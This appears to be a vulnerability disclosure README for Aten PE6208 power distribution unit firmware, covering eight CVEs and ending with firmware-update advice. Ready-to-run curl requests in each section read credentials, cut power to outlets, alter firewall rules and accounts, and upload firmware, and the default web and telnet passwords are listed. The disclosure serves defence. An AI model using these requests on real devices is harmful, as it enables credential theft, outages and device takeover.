# Aten PE6208 vulnerabilities

This repo contains the description of the vulnerabilities identified
in the Aten PE6208 PDU firmware. The exploitation methods described were
tested for versions v2.3.228 and v2.4.232 of the PE6208 firmware. According
to Aten, the vulnerabilities are fixed in the v2.4.239 firmware version.

# The vulnerabilities

## 1. Incorrect Access Control (CVE-2023-43846)
The logs on device can be accessed without authentication via GET request:
```
curl -s -i -k 'https://192.168.0.60/Log_information/Systemlog.csv'
```
The logs contain such information as usernames present on the device
and IP addresses of the device users.

## 2. Incorrect Access Control (CVE-2023-43843)
An attacker provided with a valid unprivileged session ID can read credentials
of all accounts, including privileged ones, via GET request.\
In such case the user management function checks for two exact things:
if the SID provided is valid and if the UID provided is _8_ which is
for the administrator account.\
To exploit the vulnerability, the following GET request may be used:
```
curl -s -i -k 'https://192.168.0.60/xml/accounts.xml?SID=1234567890abcdef&SIndex=0&UID=8
```
The credentials obtained this way may be used to login to the device
web interface or to perform password spraying attacks on the rest
of the infrastructure.

## 3. Incorrect Access Control (CVE-2023-43847)
An attacker provided with a valid unprivileged session ID can control PDU
outlets via POST request.\
In such case the outlet management function checks for two exact things:
if the SID provided is valid and if the UID provided is _8_ which is
for the administrator account.\
The parameters of the outlet management function look like _outcont40X_, where
_X_ is the outlet number. The value could be _0_ or _1_ meaning disable or enable.\
To turn an outlet off the following POST request may be used:
```
curl -s -i -k 'https://192.168.0.60/outlet_access/connections.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'outcont401=0'
```
To turn an outlet on the following POST request may be used:
```
curl -s -i -k 'https://192.168.0.60/outlet_access/connections.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'outcont401=1'
```
Turning an outlet off may result in DoS of systems relying on the PDU.

## 4. Incorrect Access Control (CVE-2023-43848)
An attacker provided with a valid unprivileged session ID can control
the device local firewall rules via POST request.\
For the sake of better undestanding of the request structure, it's fields are
described below.\
The _devsecuflg07_ field is a flag indicating if the firewall is enabled.
If the value is _0_, the firewall is disabled, and otherwise if it's set to _1_.\
During the firewall altering request handling, the IP addresses are grouped by pairs.
The first address in a pair is the starting point of the range and the second is
the ending point of the range. When the range is specified, the firewall excludes
or includes the whole range from or to the addresses allowed on the device.\
The pairs mapping is as follows:
```
'devsecuip00': '0.0.0.0', 'devsecuip05': '0.0.0.0',
'devsecuip01': '0.0.0.0', 'devsecuip06': '0.0.0.0',
'devsecuip02': '0.0.0.0', 'devsecuip07': '0.0.0.0',
'devsecuip03': '0.0.0.0', 'devsecuip08': '0.0.0.0',
'devsecuip04': '0.0.0.0', 'devsecuip09': '0.0.0.0'
```
MAC addresses are handled the same way and the mapping is as follows:
```
'devsecumac00': '000000000000', 'devsecumac01': '000000000000',
'devsecumac02': '000000000000', 'devsecumac03': '000000000000',
'devsecumac04': '000000000000'
```
Finally, to alter the local firewall of the PDU, the following POST request
may be used:
```
curl -s -i -k 'https://192.168.0.60/device_management/security.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'devsecuip01=0.0.0.0&devsecuip06=0.0.0.0'
```
The parameters of the request above may be adapted depending on the result wanted.\
Like in the cases above, the firewall management function checks for two exact
things: if the SID provided is valid and if the UID provided is _8_ which is
for the administrator account.

## 5. Incorrect Access Control (CVE-2023-43842)
An attacker provided with a valid unprivileged session ID can add, remove
or change existing accounts of unprivileged users on the device via POST request.\
The parameters of the user management function look like _uXYZ_.
The _YZ_ is the number reffering to the target user.
The _X_ could be _1_, _2_ or _3_:
- _1_ means the value of the parameter is the username supplied.
- _2_ means the value of the parameter is the password supplied.
- _3_ means the value of the parameter is the action requested.

The action value could be _0_ to remove an account or _1_ to add an account.
If an account already present is to be added, it's just updated with the
credentials supplied.\
To add or update an account with username _user_ and with password _pass_
a POST request may be used:
```
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=1&u103=test&u203=test&'
```
To remove an account number _03_ a POST request may be used:
```
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=0&'
```

## 6. Incorrect Access Control (CVE-2023-43849)
The firmware upload process is based on sending payload fragments via POST
requests without any authentication. An attacker can use it to interfere with
a firmware update process like this:
```
curl -s -i -k 'https://192.168.0.60/xml/firmware_upgrade.xml?SID=1234567890abcdef&CheckVersion=0&Name=administrator'
curl -s -i -k 'https://192.168.0.60/maintenance/fwupgrade.cgi' -X POST -d '------WebKitFormBoundary1234567890ABCdef\nContent-Disposition: form-data; name="FWfileName"; filename="payload.bin"\nContent-Type: application/octet-stream\n$FRAGMENT
```
Looped requests like this may be used to upload modified firmware containing
malicious code resulting in fully compromised device.
After such a manipulation a legitimate firmware upload may be not possible.

## 7. Improper Input Validation (CVE-2023-43850)
If an attacker provided with a valid unprivileged session ID adds a user with
a name containing opening angle bracket, a partial DoS of web interface
happens. While such a user is present, administrator can't see list of users
or edit accounts. Also logs are not available for viewing while containing
a record with such a name of user.\
To cause the behavior described, the following POST request may be used:
```
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=1&u103=<&u203=test&'
```
Since this is a particular case of the account altering, the user management
function still checks for two exact things: if the SID provided is valid
and if the UID provided is _8_ which is for the administrator account.

## 8. Default credentials (CVE-2023-43844, CVE-2023-43845)
The device can be managed via web interface or via telnet. Both methods use
privileged accounts with the default credentials presented below:
```
administrator : password # for web
teladmin : telpwd        # for telnet
```
The user is never forced to change the default credentials.

# Remediation
Since according to Aten the issues are solved in v.2.4.239 firmware version,
to avoid potential risks a customer should update their device firmware
to this version. The firmware is avalaible at the [official site](https://www.aten.com/global/en/products/power-distribution-&-racks/rack-pdu/pe6208/) of Aten
at the _Support and Downloads_ tab.
